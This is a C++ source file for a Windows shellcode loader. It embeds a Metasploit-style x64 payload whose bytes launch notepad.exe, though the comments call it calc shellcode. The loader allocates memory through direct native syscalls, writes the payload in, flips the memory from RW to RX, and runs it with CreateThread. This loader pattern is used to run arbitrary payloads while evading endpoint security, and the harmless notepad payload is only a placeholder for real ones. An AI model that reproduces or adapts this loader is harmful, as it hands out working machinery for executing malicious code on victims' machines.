#include "shellcode_runner.h"
#include "../syscalls/native_syscalls.h"
#include "../logger/logger.h"
#include <iostream>

// x64 Calc Shellcode (Stack String - partially obfuscated or just raw)
// Standard Metasploit/Cobalt Strike style "pop calc"
std::vector<unsigned char> ShellcodeRunner::GetCalcShellcode() {
    // 272 bytes calc.exe
    // x64 Notepad.exe Shellcode (MsgBox/Notepad is more reliable than Calc on some Win10/11)
    // Source: https://github.com/peterferrie/win-exec-calc-shellcode (or standard msfvenom)
    // This is a basic "WinExec('notepad.exe', 1)" shellcode.
    unsigned char buf[] = 
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
    "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
    "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
    "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
    "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
    "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
    "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
    "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1"
    "\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45"
    "\x39\xca\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
    "\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
    "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48"
    "\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
    "\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00"
    "\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5"
    "\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83"
    "\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72"
    "\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x6e\x6f\x74\x65\x70\x61"
    "\x64\x2e\x65\x78\x65\x00";

    return std::vector<unsigned char>(buf, buf + sizeof(buf));
}

void ShellcodeRunner::Run() {
    LOG_INFO("[ShellcodeRunner] Starting Shellcode Execution (Notepad)...");

    std::vector<unsigned char> shellcode = GetCalcShellcode();
    LOG_INFO("[ShellcodeRunner] Payload Size: " + std::to_string(shellcode.size()) + " bytes");

    PVOID baseAddress = NULL;
    SIZE_T regionSize = shellcode.size();
    HANDLE hProcess = (HANDLE)-1; // Current Process

    // 1. Allocate (RW)
    LOG_INFO("[ShellcodeRunner] 1. Allocating Memory (RW)...");
    NTSTATUS status = NativeSyscalls::AllocateVirtualMemory(
        hProcess, 
        &baseAddress, 
        0, 
        &regionSize, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_READWRITE // RW Initial
    );

    if (status != 0) {
        LOG_ERROR("[ShellcodeRunner] Allocate Failed: " + std::to_string(status));
        return;
    }
    Logger::HexDump(&baseAddress, 8, "Allocated Address");

    // 2. Write
    LOG_INFO("[ShellcodeRunner] 2. Writing Payload...");
    SIZE_T bytesWritten = 0;
    status = NativeSyscalls::WriteVirtualMemory(
        hProcess,
        baseAddress,
        shellcode.data(),
        shellcode.size(),
        &bytesWritten
    );
     if (status != 0) {
        LOG_ERROR("[ShellcodeRunner] Write Failed: " + std::to_string(status));
        return;
    }

    // 3. Protect (RX)
    LOG_INFO("[ShellcodeRunner] 3. Changing Protection (RW -> RX)...");
    ULONG oldProtect = 0;
    status = NativeSyscalls::ProtectVirtualMemory(
        hProcess,
        &baseAddress,
        &regionSize,
        PAGE_EXECUTE_READ, // 0x20
        &oldProtect
    );
    if (status != 0) {
        LOG_ERROR("[ShellcodeRunner] Protect Failed: " + std::to_string(status));
        return;
    }

    // 4. Execute
    LOG_INFO("[ShellcodeRunner] 4. Executing (CreateThread)...");
    
    DWORD threadId;
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)baseAddress, NULL, 0, &threadId);
    
    if (hThread) {
        LOG_SUCCESS("[ShellcodeRunner] Thread Created. TID: " + std::to_string(threadId));
        LOG_WARN("[ShellcodeRunner] Waiting for payload execution...");
        WaitForSingleObject(hThread, 2000); // Wait 2s for calc to pop
        LOG_INFO("[ShellcodeRunner] Execution flow resumed.");
        CloseHandle(hThread);
    } else {
        LOG_ERROR("[ShellcodeRunner] CreateThread Failed: " + std::to_string(GetLastError()));
    }
}
